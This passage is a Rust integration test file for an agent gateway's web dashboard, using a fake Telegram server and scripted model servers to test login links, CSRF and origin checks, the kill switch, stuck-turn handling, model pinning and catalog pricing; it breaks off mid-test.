//! M22 through the real `ferrule` binary, a fake Telegram and scripted
//! OpenAI-compatible servers (one of them serving a recorded OpenRouter
//! `/models`): the one-time link, the session and CSRF; the health view
//! with a stuck turn, `/stop` and the kill switch; the default and pins
//! agreeing with Telegram and the config; every model down and a catalog
//! pick fixing it; the usage against `ferrule ledger`; no secret in any
//! response; and the eval never touching the dashboard.

use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::{Command, Output};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

const SECRET: &str = "sk-SEEDED-dashboard-0123456789abcdef";
const FIXTURE: &str = include_str!("fixtures/openrouter-models.json");

// ---- A scripted model server ---------------------------------------------

fn text(m: &Value) -> String {
    m["content"].as_str().unwrap_or_default().to_string()
}

fn answer(text: &str) -> Value {
    json!({
        "choices": [{
            "message": {"role": "assistant", "content": text},
            "finish_reason": "stop",
        }],
        "usage": {"prompt_tokens": 100, "completion_tokens": 10},
    })
}

fn call(name: &str, args: Value) -> Value {
    let id = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    json!({
        "choices": [{
            "message": {
                "role": "assistant",
                "content": null,
                "tool_calls": [{
                    "id": format!("call_{id}"),
                    "type": "function",
                    "function": {"name": name, "arguments": args.to_string()},
                }],
            },
            "finish_reason": "tool_calls",
        }],
        "usage": {"prompt_tokens": 100, "completion_tokens": 10},
    })
}

/// `<label>:<model>`, or a `sleep 30` for a task saying HANG; `GET
/// /models` answers with the recorded OpenRouter list. `failing` models
/// (or `*`) answer 503, and `offline` refuses `/models`.
struct Server {
    url: String,
    failing: Arc<Mutex<Vec<String>>>,
    offline: Arc<AtomicBool>,
    calls: Arc<Mutex<Vec<String>>>,
}

impl Server {
    fn start(label: &'static str) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!(
            "http://127.0.0.1:{}/v1",
            listener.local_addr().unwrap().port()
        );
        let failing: Arc<Mutex<Vec<String>>> = Arc::default();
        let offline = Arc::new(AtomicBool::new(false));
        let calls: Arc<Mutex<Vec<String>>> = Arc::default();
        let (f, o, c) = (failing.clone(), offline.clone(), calls.clone());
        std::thread::spawn(move || {
            for stream in listener.incoming().flatten() {
                let (f, o, c) = (f.clone(), o.clone(), c.clone());
                std::thread::spawn(move || serve(label, stream, &f, &o, &c));
            }
        });
        Self {
            url,
            failing,
            offline,
            calls,
        }
    }

    fn fail(&self, model: &str) -> &Self {
        self.failing.lock().unwrap().push(model.into());
        self
    }

    fn calls(&self) -> Vec<String> {
        self.calls.lock().unwrap().clone()
    }
}

fn read_request(stream: &TcpStream) -> Option<(String, BTreeMap<String, String>, Vec<u8>)> {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut first = String::new();
    if reader.read_line(&mut first).unwrap_or(0) == 0 {
        return None;
    }
    let mut headers = BTreeMap::new();
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line).unwrap_or(0) == 0 {
            return None;
        }
        let line = line.trim_end();
        if line.is_empty() {
            break;
        }
        if let Some((name, value)) = line.split_once(':') {
            headers.insert(name.trim().to_ascii_lowercase(), value.trim().to_string());
        }
    }
    let length = headers
        .get("content-length")
        .and_then(|l| l.parse().ok())
        .unwrap_or(0);
    let mut body = vec![0; length];
    reader.read_exact(&mut body).ok()?;
    Some((first.trim_end().to_string(), headers, body))
}

fn respond(mut stream: TcpStream, head: &str, out: &str) {
    let _ = write!(
        stream,
        "HTTP/1.1 {head}\r\ncontent-type: application/json\r\nretry-after: 0\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{out}",
        out.len()
    );
}

fn serve(
    label: &str,
    stream: TcpStream,
    failing: &Mutex<Vec<String>>,
    offline: &AtomicBool,
    calls: &Mutex<Vec<String>>,
) {
    let Some((first, _, body)) = read_request(&stream) else {
        return;
    };
    if first.starts_with("GET ") {
        if first.contains("/models") && !offline.load(Ordering::SeqCst) {
            return respond(stream, "200 OK", FIXTURE);
        }
        return respond(stream, "503 Service Unavailable", r#"{"error":"offline"}"#);
    }
    let req: Value = serde_json::from_slice(&body).unwrap_or(Value::Null);
    let model = req["model"].as_str().unwrap_or_default().to_string();
    calls.lock().unwrap().push(model.clone());
    let fails = failing
        .lock()
        .unwrap()
        .iter()
        .any(|f| f == "*" || *f == model);
    if fails {
        return respond(
            stream,
            "503 Service Unavailable",
            &json!({"error": {"message": "scripted 503"}}).to_string(),
        );
    }
    let messages = req["messages"].as_array().cloned().unwrap_or_default();
    let task = messages
        .iter()
        .rev()
        .find(|m| m["role"] == "user")
        .map(text)
        .unwrap_or_default();
    let after_tool = messages.last().is_some_and(|m| m["role"] == "tool");
    let out = if task.contains("HANG") && !after_tool {
        call("shell", json!({"command": "sleep 30"}))
    } else {
        answer(&format!("{label}:{model}"))
    };
    respond(stream, "200 OK", &out.to_string());
}

// ---- A fake Telegram -----------------------------------------------------

struct FakeTelegram {
    url: String,
    queue: Arc<Mutex<std::collections::VecDeque<Value>>>,
    sent: Arc<Mutex<Vec<Value>>>,
    next: Mutex<i64>,
}

impl FakeTelegram {
    fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
        let queue: Arc<Mutex<std::collections::VecDeque<Value>>> = Arc::default();
        let sent: Arc<Mutex<Vec<Value>>> = Arc::default();
        let (q, s) = (queue.clone(), sent.clone());
        std::thread::spawn(move || {
            for stream in listener.incoming().flatten() {
                let (q, s) = (q.clone(), s.clone());
                std::thread::spawn(move || telegram_serve(stream, &q, &s));
            }
        });
        Self {
            url,
            queue,
            sent,
            next: Mutex::new(1),
        }
    }

    fn say_from(&self, chat: i64, from: i64, text: &str) {
        let mut next = self.next.lock().unwrap();
        *next += 1;
        self.queue.lock().unwrap().push_back(json!({
            "update_id": *next,
            "message": {"message_id": *next, "chat": {"id": chat},
                        "from": {"id": from, "username": format!("u{from}")},
                        "text": text, "date": 1700000000},
        }));
    }

    fn say(&self, chat: i64, text: &str) {
        self.say_from(chat, chat, text)
    }

    /// A message to `chat` containing `needle`, after the first `from`
    /// sent anywhere: where it was and its text.
    fn wait_for(&self, chat: i64, needle: &str, from: usize) -> (usize, String) {
        let deadline = Instant::now() + Duration::from_secs(30);
        loop {
            {
                let sent = self.sent.lock().unwrap();
                for (i, m) in sent.iter().enumerate().skip(from) {
                    let text = m["text"].as_str().unwrap_or_default();
                    if m["chat_id"] == chat.to_string().as_str() && text.contains(needle) {
                        return (i + 1, text.to_string());
                    }
                }
                assert!(
                    Instant::now() < deadline,
                    "no message to {chat} with {needle:?}; sent: {sent:#?}"
                );
            }
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn all(&self) -> String {
        serde_json::to_string(&*self.sent.lock().unwrap()).unwrap()
    }
}

fn telegram_serve(
    stream: TcpStream,
    queue: &Mutex<std::collections::VecDeque<Value>>,
    sent: &Mutex<Vec<Value>>,
) {
    let Some((first, _, body)) = read_request(&stream) else {
        return;
    };
    let out = if first.contains("getUpdates") {
        let mut updates: Vec<Value> = queue.lock().unwrap().drain(..).collect();
        if updates.is_empty() {
            std::thread::sleep(Duration::from_millis(100));
            updates = queue.lock().unwrap().drain(..).collect();
        }
        json!({"ok": true, "result": updates})
    } else {
        let mut sent = sent.lock().unwrap();
        sent.push(serde_json::from_slice(&body).unwrap_or(Value::Null));
        json!({"ok": true, "result": {"message_id": 1000 + sent.len()}})
    }
    .to_string();
    respond(stream, "200 OK", &out);
}

// ---- The binary ----------------------------------------------------------

fn plain(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let mut out = String::new();
    let mut chars = text.chars();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            for c in chars.by_ref() {
                if c.is_ascii_alphabetic() {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn home(config: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    for d in ["work", "data", "home", "tmp"] {
        std::fs::create_dir_all(dir.path().join(d)).unwrap();
    }
    std::fs::write(dir.path().join("ferrule.toml"), config).unwrap();
    dir
}

fn command(home: &Path, args: &[&str], env: &[(&str, &str)]) -> Command {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_ferrule"));
    cmd.args(args)
        .current_dir(home.join("work"))
        .env("FERRULE_CONFIG", home.join("ferrule.toml"))
        .env("FERRULE_DATA_DIR", home.join("data"))
        .env("FERRULE_TEST_KEY", "sk-test")
        .env("FERRULE_TEST_TG", "TESTTOKEN")
        .env("TMPDIR", home.join("tmp"));
    for var in [
        "HOME",
        "USERPROFILE",
        "XDG_CONFIG_HOME",
        "XDG_DATA_HOME",
        "APPDATA",
        "LOCALAPPDATA",
    ] {
        cmd.env(var, home.join("home"));
    }
    for var in [
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "ALL_PROXY",
        "http_proxy",
        "https_proxy",
        "all_proxy",
        "NOTIFY_SOCKET",
        "WATCHDOG_USEC",
        "WATCHDOG_PID",
    ] {
        cmd.env_remove(var);
    }
    for (k, v) in env {
        cmd.env(k, v);
    }
    cmd
}

fn ferrule(home: &Path, args: &[&str]) -> Output {
    command(home, args, &[]).output().unwrap()
}

fn describe(out: &Output) -> String {
    format!(
        "status {:?}\nstdout:\n{}\nstderr:\n{}",
        out.status.code(),
        plain(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    )
}

struct Running(std::process::Child);

impl Drop for Running {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

fn gateway(home: &Path, env: &[(&str, &str)]) -> Running {
    let mut cmd = command(home, &["gateway"], env);
    cmd.stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    Running(cmd.spawn().unwrap())
}

/// `[gateway]` for the fake Telegram (the group -100 and 42, the owner),
/// local links only, and no reference catalog from the internet.
fn telegram(tg: &FakeTelegram) -> String {
    format!(
        "\n[gateway]\ntelegram_token_env = \"FERRULE_TEST_TG\"\ntelegram_base_url = \"{}\"\ntelegram_allowed_chats = [-100, 42]\n\n[dashboard]\nremote = \"off\"\n",
        tg.url
    )
}

/// Provider `a` (a-one, a-two) and `b` (b-large, b-small), `fast` =
/// b/b-small, default_provider `a`; `models` goes into `[models]`.
fn two(a: &Server, b: &Server, models: &str, extra: &str) -> String {
    format!(
        r#"default_provider = "a"

[providers.a]
base_url = "{}"
api_key_env = "FERRULE_TEST_KEY"
model = "a-one"

[providers.a.models."a-two"]

[providers.b]
base_url = "{}"
api_key_env = "FERRULE_TEST_KEY"
model = "b-large"

[providers.b.models."b-small"]

[models]
catalog_url = ""
{models}

[models.aliases]
fast = "b/b-small"

[skills]
enabled = false

[sandbox]
mode = "off"
{extra}
"#,
        a.url, b.url
    )
}

// ---- The page, as a browser would use it --------------------------------

/// One HTTP/1.1 request to the dashboard: the status, the headers and
/// the body.
fn http(
    port: u16,
    method: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &str,
) -> (u16, BTreeMap<String, String>, String) {
    let mut s = TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(90))).unwrap();
    let mut req = format!(
        "{method} {path} HTTP/1.1\r\nhost: 127.0.0.1:{port}\r\nconnection: close\r\ncontent-length: {}\r\n",
        body.len()
    );
    for (k, v) in headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    req.push_str("\r\n");
    req.push_str(body);
    s.write_all(req.as_bytes()).unwrap();
    let mut raw = Vec::new();
    s.read_to_end(&mut raw).unwrap();
    let raw = String::from_utf8_lossy(&raw).into_owned();
    let (head, rest) = raw.split_once("\r\n\r\n").unwrap_or((&raw, ""));
    let mut lines = head.lines();
    let status = lines
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok())
        .unwrap_or(0);
    let mut out = BTreeMap::new();
    for l in lines {
        if let Some((k, v)) = l.split_once(':') {
            out.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
        }
    }
    let body = if out
        .get("transfer-encoding")
        .is_some_and(|t| t.contains("chunked"))
    {
        unchunk(rest)
    } else {
        rest.to_string()
    };
    (status, out, body)
}

fn unchunk(mut s: &str) -> String {
    let mut out = String::new();
    while let Some((size, rest)) = s.split_once("\r\n") {
        let n = usize::from_str_radix(size.trim(), 16).unwrap_or(0);
        if n == 0 {
            break;
        }
        out.push_str(&rest[..n]);
        s = rest[n..].trim_start_matches("\r\n");
    }
    out
}

/// `http://127.0.0.1:<port>/login#<token>` in `text`.
fn link_in(text: &str) -> (u16, String) {
    let at = text.find("http://127.0.0.1:").expect("a link") + "http://127.0.0.1:".len();
    let rest = &text[at..];
    let (port, rest) = rest.split_once("/login#").expect("a login link");
    let token: String = rest.chars().take_while(|c| !c.is_whitespace()).collect();
    (port.parse().unwrap(), token)
}

struct Page {
    port: u16,
    cookie: String,
    csrf: String,
}

fn origin(port: u16) -> String {
    format!("http://127.0.0.1:{port}")
}

/// Signs in with a link's token; the status when refused.
fn login(port: u16, token: &str) -> Result<Page, u16> {
    let o = origin(port);
    let (status, headers, body) = http(
        port,
        "POST",
        "/api/login",
        &[("origin", &o), ("content-type", "application/json")],
        &json!({ "token": token }).to_string(),
    );
    if status != 200 {
        return Err(status);
    }
    let cookie = headers["set-cookie"].split(';').next().unwrap().to_string();
    let csrf = serde_json::from_str::<Value>(&body).unwrap()["csrf"]
        .as_str()
        .unwrap()
        .to_string();
    Ok(Page { port, cookie, csrf })
}

impl Page {
    fn get_raw(&self, path: &str) -> (u16, String) {
        let (s, _, b) = http(self.port, "GET", path, &[("cookie", &self.cookie)], "");
        (s, b)
    }

    fn get(&self, path: &str) -> (u16, Value) {
        let (s, b) = self.get_raw(&format!("/api/{path}"));
        (s, serde_json::from_str(&b).unwrap_or(Value::String(b)))
    }

    /// A GET that must answer 200.
    fn read(&self, path: &str) -> Value {
        let (s, v) = self.get(path);
        assert_eq!(s, 200, "GET {path}: {v}");
        v
    }

    fn post(&self, path: &str, body: Value) -> (u16, Value) {
        let o = origin(self.port);
        let (s, _, b) = http(
            self.port,
            "POST",
            &format!("/api/{path}"),
            &[
                ("cookie", &self.cookie),
                ("origin", &o),
                ("content-type", "application/json"),
                ("x-ferrule-csrf", &self.csrf),
            ],
            &body.to_string(),
        );
        (s, serde_json::from_str(&b).unwrap_or(Value::String(b)))
    }

    /// Polls `path` until `ok` holds, for up to 30 s.
    fn until(&self, path: &str, ok: impl Fn(&Value) -> bool) -> Value {
        let deadline = Instant::now() + Duration::from_secs(30);
        loop {
            let v = self.read(path);
            if ok(&v) {
                return v;
            }
            assert!(
                Instant::now() < deadline,
                "GET {path} never got there: {v:#}"
            );
            std::thread::sleep(Duration::from_millis(100));
        }
    }
}

/// The owner asks for a link in their chat and signs in with it.
fn sign_in(tg: &FakeTelegram, from: usize) -> (usize, Page) {
    tg.say(42, "/dashboard");
    let (n, said) = tg.wait_for(42, "Dashboard: ", from);
    let (port, token) = link_in(&said);
    (n, login(port, &token).expect("the link signs in"))
}

fn problems(health: &Value) -> Vec<String> {
    health["problems"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| p["what"].as_str().unwrap_or_default().to_string())
        .collect()
}

fn default_of(models: &Value) -> String {
    models["view"]["models"]
        .as_array()
        .unwrap()
        .iter()
        .find(|m| m["default"] == true)
        .map(|m| m["reference"].as_str().unwrap().to_string())
        .unwrap_or_default()
}

// ---- The tests -----------------------------------------------------------

#[test]
fn a_link_signs_in_once_for_the_owner_only_and_dashboard_off_revokes_it() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &telegram(&tg)));
    let home = dir.path();
    let _gw = gateway(home, &[]);

    // A stranger gets nothing at all; /status after it is the sync point.
    tg.say_from(-100, 7, "/dashboard");
    tg.say_from(-100, 7, "/status");
    let (n, _) = tg.wait_for(-100, "ferrule ", 0);
    assert!(!tg.all().contains("/login#"), "{}", tg.all());

    // The owner in the group: the link goes to the private chat only.
    tg.say_from(-100, 42, "/dashboard");
    let (_, said) = tg.wait_for(-100, "private chat", n);
    assert!(!said.contains("/login#"), "{said}");
    let (n, private) = tg.wait_for(42, "Dashboard: ", n);
    let (port, token) = link_in(&private);
    assert!(private.contains("One login, valid for 10 min"), "{private}");

    // Nothing without a session, and a tampered link fails.
    let (s, _, _) = http(port, "GET", "/api/health", &[], "");
    assert_eq!(s, 401);
    let mut bad = token.clone();
    let last = bad.pop().unwrap();
    bad.push(if last == 'A' { 'B' } else { 'A' });
    assert_eq!(login(port, &bad).err(), Some(401));
    // An unknown host is refused before anything else.
    let (s, _, _) = http(port, "GET", "/", &[("host", "evil.example")], "");
    assert!(s == 421 || s == 400, "{s}");

    // The link works once.
    let page = login(port, &token).expect("the owner's link");
    assert_eq!(login(port, &token).err(), Some(401), "a second use fails");
    let (s, html) = page.get_raw("/");
    assert_eq!(s, 200);
    assert!(html.contains("app.js"), "{html}");
    let health = page.read("health");
    assert_eq!(health["gateway"], true);
    assert_eq!(health["kill"]["on"], false);

    // A POST without the CSRF header, or from another origin, is refused.
    let o = origin(port);
    let (s, _, _) = http(
        port,
        "POST",
        "/api/kill/on",
        &[
            ("cookie", &page.cookie),
            ("origin", &o),
            ("content-type", "application/json"),
        ],
        r#"{"confirm":true}"#,
    );
    assert_eq!(s, 403);
    let (s, _, _) = http(
        port,
        "POST",
        "/api/kill/on",
        &[
            ("cookie", &page.cookie),
            ("origin", "https://evil.example"),
            ("content-type", "application/json"),
            ("x-ferrule-csrf", &page.csrf),
        ],
        r#"{"confirm":true}"#,
    );
    assert_eq!(s, 403);
    assert_eq!(page.read("health")["kill"]["on"], false);

    // The kill switch asks first, then shows on top and in Telegram.
    let (s, v) = page.post("kill/on", json!({}));
    assert_eq!(s, 409, "{v}");
    assert_eq!(page.read("health")["kill"]["on"], false);
    let (s, v) = page.post(
        "kill/on",
        json!({"confirm": true, "reason": "from the page"}),
    );
    assert_eq!(s, 200, "{v}");
    let health = page.read("health");
    assert_eq!(health["kill"]["on"], true);
    assert!(
        problems(&health)[0].contains("kill switch is on"),
        "{health:#}"
    );
    tg.say(42, "/status");
    let (n, status) = tg.wait_for(42, "ferrule ", n);
    assert!(status.contains("kill switch: ON"), "{status}");
    // /dashboard still answers with the kill switch on.
    tg.say(42, "/dashboard");
    let (n, second) = tg.wait_for(42, "Dashboard: ", n);
    let (_, unused) = link_in(&second);
    let (s, _) = page.post("kill/off", json!({"confirm": true}));
    assert_eq!(s, 200);
    assert_eq!(page.read("health")["kill"]["on"], false);
    let audit = std::fs::read_to_string(home.join("data/trust/audit.jsonl")).unwrap();
    assert!(audit.contains("dashboard"), "{audit}");

    // /dashboard off ends the session and the unused link.
    tg.say(42, "/dashboard off");
    tg.wait_for(42, "Dashboard closed", n);
    let (s, _) = page.get("health");
    assert_eq!(s, 401);
    assert_eq!(login(port, &unused).err(), Some(401));

    // The CLI prints a working link too.
    let out = ferrule(home, &["dashboard", "link"]);
    assert!(out.status.success(), "{}", describe(&out));
    let (p, t) = link_in(&plain(&out.stdout));
    assert_eq!(p, port);
    assert!(login(p, &t).is_ok());
}

#[test]
fn a_session_survives_a_restart_and_so_do_revocation_and_a_used_link() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &telegram(&tg)));
    let home = dir.path();
    let gw = gateway(home, &[]);
    let (n, page) = sign_in(&tg, 0);
    tg.say(42, "/dashboard");
    let (n, second) = tg.wait_for(42, "Dashboard: ", n);
    let (_, used) = link_in(&second);
    assert!(login(page.port, &used).is_ok());
    tg.say(42, "/dashboard");
    let (_, third) = tg.wait_for(42, "Dashboard: ", n);
    let (_, unused) = link_in(&third);
    let sessions = home.join("data/private/dashboard/sessions.json");
    let text = std::fs::read_to_string(&sessions).unwrap();
    assert!(
        !text.contains(page.cookie.split('=').nth(1).unwrap()),
        "{text}"
    );

    // A hard stop, then a new gateway: the same browser is still in.
    drop(gw);
    let gw = gateway(home, &[]);
    let port = restarted_port(home);
    let page = Page { port, ..page };
    assert_eq!(page.read("health")["gateway"], true);
    let (s, v) = page.post("kill/on", json!({}));
    assert_eq!(s, 409, "the CSRF token still holds: {v}");
    // The used link stays used; the unused one still works, once.
    assert_eq!(login(port, &used).err(), Some(401));
    assert!(login(port, &unused).is_ok());
    assert_eq!(login(port, &unused).err(), Some(401));

    // Revoked, then restarted: still revoked.
    let out = ferrule(home, &["dashboard", "revoke"]);
    assert!(out.status.success(), "{}", describe(&out));
    assert_eq!(page.get("health").0, 401);
    drop(gw);
    let _gw = gateway(home, &[]);
    let port = restarted_port(home);
    assert_eq!(Page { port, ..page }.get("health").0, 401);
}

/// The port of a freshly started gateway's page, from `ferrule dashboard
/// link` once it answers.
fn restarted_port(home: &Path) -> u16 {
    let deadline = Instant::now() + Duration::from_secs(30);
    loop {
        let out = ferrule(home, &["dashboard", "link"]);
        let text = plain(&out.stdout);
        if out.status.success() && text.contains("/login#") {
            return link_in(&text).0;
        }
        assert!(Instant::now() < deadline, "{}", describe(&out));
        std::thread::sleep(Duration::from_millis(200));
    }
}

#[test]
fn the_page_shows_a_stuck_turn_and_stops_it() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let extra = format!("{}\n[health]\nwatchdog_after_secs = 1\n", telegram(&tg));
    let dir = home(&two(&a, &b, "", &extra));
    let _gw = gateway(dir.path(), &[]);
    let (n, page) = sign_in(&tg, 0);

    tg.say(-100, "HANG please");
    let health = page.until("health", |h| {
        h["turns"]
            .as_array()
            .is_some_and(|t| t.iter().any(|t| t["stuck"] == true))
    });
    let turn = health["turns"]
        .as_array()
        .unwrap()
        .iter()
        .find(|t| t["stuck"] == true)
        .unwrap()
        .clone();
    assert_eq!(turn["place"], "telegram chat -100", "{turn}");
    assert!(
        turn["activity"].as_str().unwrap().contains("shell"),
        "{turn}"
    );
    assert!(
        problems(&health).iter().any(|p| p.contains("Stuck on")),
        "{health:#}"
    );
    assert_eq!(health["watchdog"]["after_secs"], 1);

    let (s, v) = page.post("turn/stop", json!({"session": turn["session"]}));
    assert_eq!(s, 200, "{v}");
    tg.wait_for(-100, "Stopped from dashboard: I ended this turn", n);
    page.until("health", |h| {
        h["turns"]
            .as_array()
            .is_some_and(|t| t.iter().all(|t| t["busy_secs"].is_null()))
    });
    // The lane takes the next message.
    tg.say(-100, "after the stop");
    tg.wait_for(-100, "A:a-one", n);
}

#[test]
fn the_default_and_pins_set_on_the_page_agree_with_telegram_and_the_config() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &telegram(&tg)));
    let home = dir.path();
    let _gw = gateway(home, &[]);
    let (n, page) = sign_in(&tg, 0);

    let (s, v) = page.post("models/default", json!({"model": "fast"}));
    assert_eq!(s, 200, "{v}");
    assert_eq!(default_of(&page.read("models")), "b/b-small");
    tg.say(42, "/model");
    let (n, _) = tg.wait_for(42, "Default: b/b-small", n);
    tg.say(42, "hello");
    let (n, _) = tg.wait_for(42, "B:b-small", n);
    let config = std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    assert!(config.contains(r#"default = "fast""#), "{config}");

    let (s, v) = page.post("models/pin", json!({"chat": "-100", "model": "a/a-two"}));
    assert_eq!(s, 200, "{v}");
    tg.say(-100, "/status");
    let (n, status) = tg.wait_for(-100, "ferrule ", n);
    assert!(
        status.contains("pinned: telegram:-100 → a/a-two"),
        "{status}"
    );
    tg.say(-100, "group question");
    let (n, _) = tg.wait_for(-100, "A:a-two", n);

    // Telegram's /model shows on the page.
    tg.say(42, "/model default b");
    let (n, _) = tg.wait_for(42, "b/b-large", n);
    assert_eq!(default_of(&page.read("models")), "b/b-large");

    // A hand edit shows on the next refresh.
    let config = std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    assert!(config.contains(r#"default = "b/b-large""#), "{config}");
    std::thread::sleep(Duration::from_millis(1100));
    std::fs::write(
        home.join("ferrule.toml"),
        config.replace(r#"default = "b/b-large""#, r#"default = "a/a-two""#),
    )
    .unwrap();
    page.until("models", |m| default_of(m) == "a/a-two");

    let (s, _) = page.post("models/unpin", json!({"chat": "-100"}));
    assert_eq!(s, 200);
    assert!(page.read("models")["view"]["pins"]
        .as_array()
        .unwrap()
        .is_empty());
    tg.say(-100, "unpinned");
    tg.wait_for(-100, "A:a-two", n);
    let audit = std::fs::read_to_string(home.join("data/trust/audit.jsonl")).unwrap();
    assert!(
        audit.contains("model.default") && audit.contains("\"dashboard\""),
        "{audit}"
    );
}

#[test]
fn with_every_model_down_the_page_opens_on_the_outage_and_a_catalog_pick_fixes_the_next_turn() {
    let a = Server::start("A");
    let or = Server::start("OR");
    a.fail("*");
    or.fail("broken/model");
    let tg = FakeTelegram::start();
    let config = format!(
        r#"default_provider = "a"

[providers.a]
base_url = "{a}"
api_key_env = "FERRULE_TEST_KEY"
model = "a-one"

[providers.or]
base_url = "{or}"
api_key_env = "FERRULE_TEST_KEY"
model = "broken/model"

[models]
fallback = ["or"]
catalog_url = "{or}/models"

[skills]
enabled = false

[sandbox]
mode = "off"
{extra}
"#,
        a = a.url,
        or = or.url,
        extra = telegram(&tg)
    );
    let dir = home(&config);
    let home = dir.path();
    // Thirty days at 1M uncached in and 100k out a day, for the estimate.
    let day = |d: i64| {
        let t = chrono::Utc::now() - chrono::Duration::hours(24 * d + 1);
        json!({
            "timestamp": t.to_rfc3339(), "session_id": "telegram__42", "task_shape": "chat",
            "provider": "a", "model": "a-one", "iteration": 0,
            "input_tokens": 1_000_000, "cached_input_tokens": 0, "output_tokens": 100_000,
            "tool_calls": 0, "latency_ms": 100, "outcome": "ok",
        })
        .to_string()
    };
    let seeded: Vec<String> = (0..30).map(day).collect();
    std::fs::write(home.join("data/ledger.jsonl"), seeded.join("\n") + "\n").unwrap();
    let _gw = gateway(home, &[]);

    tg.say(42, "hello");
    let (n, page) = sign_in(&tg, 0);
    let health = page.until("health", |h| {
        h["problems"][0]["top"] == true
            && h["problems"][0]["what"]
                .as_str()
                .unwrap_or_default()
                .contains("is failing")
    });
    assert!(
        problems(&health)[0].contains("a/a-one"),
        "the default's outage is on top: {health:#}"
    );
    assert!(
        problems(&health)
            .iter()
            .any(|p| p.contains("or/broken/model")),
        "and the fallback's: {health:#}"
    );
    // /dashboard still answers with every model down.
    tg.say(42, "/dashboard");
    let (n, _) = tg.wait_for(42, "Dashboard: ", n);

    // The catalog: tool-capable only by default, the reason shown.
    let list = &page.read("catalog?search=")["list"];
    let ids: Vec<&str> = list["rows"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["id"].as_str().unwrap())
        .collect();
    assert!(!ids.contains(&"google/gemini-3.1-flash-image"), "{ids:?}");
    assert!(list["hidden_no_tools"].as_u64().unwrap() >= 1, "{list:#}");
    assert!(!list["tools_reason"].as_str().unwrap().is_empty());
    let all = &page.read("catalog?tools=all")["list"];
    assert!(all.to_string().contains("google/gemini-3.1-flash-image"));
    // Prices per 1M, from the fixture's per-token strings.
    let fixture: Value = serde_json::from_str(FIXTURE).unwrap();
    let raw = fixture["data"]
        .as_array()
        .unwrap()
        .iter()
        .find(|m| m["id"] == "deepseek/deepseek-v4.1-flash")
        .unwrap();
    let per_m = |s: &Value| s.as_str().unwrap().parse::<f64>().unwrap() * 1e6;
    let row = list["rows"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["id"] == "deepseek/deepseek-v4.1-flash" && r["provider"] == "or")
        .unwrap_or_else(|| panic!("{list:#}"));
    let text = row["pricing"].to_string();
    for want in [
        per_m(&raw["pricing"]["prompt"]),
        per_m(&raw["pricing"]["completion"]),
    ] {
        let found = row["pricing"]
            .as_object()
            .unwrap()
            .values()
            .filter_map(Value::as_f64)
            .any(|v| (v - want).abs() < 1e-9);
        assert!(found, "{want} per 1M not in {text}");
    }
    // `:free` is flagged, with its caveat.
    let free = list["rows"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["id"] == "qwen/qwen3.8-27b:free")
        .unwrap();
    assert_eq!(free["free"], true);
    assert!(free["caveat"].as_str().is_some(), "{free}");

    // Recommendations: the one the list no longer has is hidden and named,
    // and the estimate comes from the seeded ledger.
    let rec = page.read("recommend");
    assert!(
        rec["missing"].to_string().contains("minimax/minimax-m3"),
        "{rec:#}"
    );
    assert!(!rec["tiers"].to_string().contains("minimax/minimax-m3"));
    assert_eq!(rec["usage"]["uncached_input"], 30_000_000, "{rec:#}");
    let pick = |id: &str| -> Value {
        rec["tiers"]
            .as_array()
            .unwrap()
            .iter()
            .flat_map(|t| t["picks"].as_array().unwrap().clone())
            .find(|p| p["id"] == id)
            .unwrap_or_else(|| panic!("{id} in {rec:#}"))
    };
    let flash = pick("deepseek/deepseek-v4.1-flash")["monthly_usd"]
        .as_f64()
        .unwrap();
    let expected =
        30.0 * per_m(&raw["pricing"]["prompt"]) + 3.0 * per_m(&raw["pricing"]["completion"]);
    assert!((flash - expected).abs() < 0.01, "{flash} vs {expected}");
    assert!(
        pick("anthropic/claude-opus-5.5")["monthly_usd"]
            .as_f64()
            .unwrap()
            > flash
    );

    // One tap: tested first, then the default; the next turn works.
    let before = or.calls().len();
    let (s, v) = page.post(
        "catalog/add",
        json!({"id": "deepseek/deepseek-v4.1-flash", "as": "default", "provider": "or"}),
    );
    assert_eq!(s, 200, "{v}");
    assert!(
        or.calls()[before..].contains(&"deepseek/deepseek-v4.1-flash".to_string()),
        "the real test ran before it was saved"
    );
